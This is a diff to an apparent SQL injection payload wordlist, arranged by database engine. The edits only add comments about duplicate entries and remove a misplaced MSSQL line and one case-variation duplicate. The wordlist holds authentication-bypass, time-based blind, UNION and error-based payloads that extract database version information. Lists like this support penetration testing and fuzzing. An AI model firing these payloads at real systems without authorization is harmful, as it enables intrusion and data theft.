@@ -58,12 +58,14 @@ admin'/*
 
 # Database-specific payloads
 # MySQL
+# True-condition baseline, repeated under each engine on purpose.
 ' AND 'x'='x
 ' AND SLEEP(5) AND 'x'='x
 ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL#
 
 # PostgreSQL
 ' AND 'x'='x
+# PostgreSQL sleep, also listed in the time-based section.
 '; SELECT pg_sleep(5)--
 
 # MSSQL
@@ -127,7 +129,6 @@ admin' || 'a'=='a
 # Case variation bypass
 ' Or '1'='1'--
 ' oR '1'='1'--
-' OR '1'='1'--
 ' UnIoN SeLeCt--
 
 # Alternative operators
@@ -150,10 +151,11 @@ admin' || 'a'=='a
 
 # MSSQL
 ' OR 'a'+'a'='aa'--
-' OR 'a'||'a'='aa'--
 
 # Oracle
+# || concatenation, repeated for Oracle and PostgreSQL.
 ' OR 'a'||'a'='aa'--
+# CONCAT form, also listed under MySQL.
 ' OR CONCAT('a','a')='aa'--
 
 # PostgreSQL
@@ -200,6 +202,7 @@ CHAR(39) OR CHAR(49)=CHAR(49)  # ' OR '1'='1
 ' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version)),1)--
 
 # MSSQL
+# Same MSSQL error-based lines as the general section.
 ' AND 1=CONVERT(int,(SELECT @@version))--
 ' AND 1=CAST((SELECT @@version) AS int)--
 
